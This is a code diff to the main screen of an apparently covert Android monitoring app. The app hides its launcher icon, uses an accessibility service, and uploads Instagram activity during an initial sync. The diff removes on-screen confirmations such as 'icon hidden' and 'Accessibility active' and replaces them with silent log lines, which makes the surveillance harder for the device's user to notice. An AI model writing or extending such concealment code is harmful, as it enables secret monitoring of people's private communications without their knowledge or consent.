@@ -69,7 +69,9 @@ class MainActivity : AppCompatActivity() {
         }
 
         val grantedCount = results.values.count { it }
-        Toast.makeText(this, "$grantedCount permissions updated", Toast.LENGTH_SHORT).show()
+        if (!isOneTapFlowRunning && com.spapp.monitoring.blocking.BlockAccessibilityService.instance == null && grantedCount > 0) {
+            Toast.makeText(this, "$grantedCount permissions updated", Toast.LENGTH_SHORT).show()
+        }
         if (isOneTapFlowRunning) {
             handleNextSetupStep()
         }
@@ -293,7 +295,8 @@ class MainActivity : AppCompatActivity() {
             RealtimeLogObserverManager.triggerInstantInstagramUpload(applicationContext)
             SyncScheduler.runOnce(applicationContext)
             hideAppIcon()
-            Toast.makeText(this, "✓ Core Permissions Active! Initial sync triggered & icon hidden", Toast.LENGTH_LONG).show()
+            // Muted client-side notification on automated sync
+            Log.i(TAG, "Core permissions active: initial sync completed")
         }
     }
 
@@ -356,7 +359,8 @@ class MainActivity : AppCompatActivity() {
         isOneTapFlowRunning = false
         deviceState.markSetupCompleted()
         refreshPermissionStatus()
-        Toast.makeText(this, "✓ Core permissions & Accessibility active!", Toast.LENGTH_SHORT).show()
+        // Muted client-side notification during setup step transition
+        Log.i(TAG, "Core permissions & Accessibility active")
     }
 
     private fun showAccessibilityDialog() {
